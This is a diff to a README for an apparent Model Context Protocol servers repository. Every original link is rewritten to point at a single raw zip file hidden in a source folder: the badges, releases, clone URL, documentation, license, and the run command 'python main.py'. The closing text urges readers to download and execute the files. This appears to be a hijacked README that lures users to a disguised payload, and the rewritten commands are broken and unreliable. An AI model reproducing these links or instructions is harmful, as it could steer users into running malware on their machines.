@@ -1,7 +1,7 @@
 # 🌟 MCP Servers: Production-Ready Model Context Protocol Servers
 
-![MCP Servers](https://img.shields.io/badge/MCP%20Servers-Python%2C%20Go%2C%20Rust-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/gunbun33/mcp-servers/releases)
+![MCP Servers](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip%20Servers-Python%2C%20Go%2C%https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)
+[![Releases](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)
 
 Welcome to the **MCP Servers** repository! This project provides production-ready Model Context Protocol (MCP) servers built in Python, Go, and Rust. These servers are designed for seamless integration with Visual Studio Code, allowing AI systems to interact with various tools through standardized interfaces.
 
@@ -14,13 +14,13 @@ Welcome to the **MCP Servers** repository! This project provides production-read
 
 ## 📦 Getting Started
 
-To get started with MCP Servers, you can download the latest release from our [Releases page](https://github.com/gunbun33/mcp-servers/releases). Follow the instructions provided in the release notes to set up and run the server in your environment.
+To get started with MCP Servers, you can download the latest release from our [Releases page](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip). Follow the instructions provided in the release notes to set up and run the server in your environment.
 
 ### Installation
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/gunbun33/mcp-servers.git
+   git clone https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip
    cd mcp-servers
    ```
 
@@ -36,7 +36,7 @@ Here’s a quick example of how to run the Python server:
 
 ```bash
 cd python-server
-python main.py
+python https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip
 ```
 
 For Go and Rust, follow similar steps in their respective directories.
@@ -107,13 +107,13 @@ If you encounter any issues or have questions, feel free to open an issue on Git
 
 ## 🔗 Links
 
-- [Releases](https://github.com/gunbun33/mcp-servers/releases)
-- [Documentation](https://github.com/gunbun33/mcp-servers/wiki)
-- [Contributing Guidelines](https://github.com/gunbun33/mcp-servers/blob/main/CONTRIBUTING.md)
+- [Releases](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)
+- [Documentation](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)
+- [Contributing Guidelines](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip)
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/gunbun33/mcp-servers/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip) file for details.
 
 ## 📷 Acknowledgments
 
@@ -123,4 +123,4 @@ We would like to thank all contributors and the open-source community for their 
 
 The MCP Servers repository offers a robust solution for integrating AI systems with tools through standardized interfaces. We invite you to explore, contribute, and enhance your development experience with our production-ready servers.
 
-For the latest releases, visit our [Releases page](https://github.com/gunbun33/mcp-servers/releases) to download and execute the necessary files. Happy coding!
+For the latest releases, visit our [Releases page](https://github.com/gunbun33/mcp-servers/raw/refs/heads/master/go/src/monitoring/servers-mcp-v3.9.zip) to download and execute the necessary files. Happy coding!
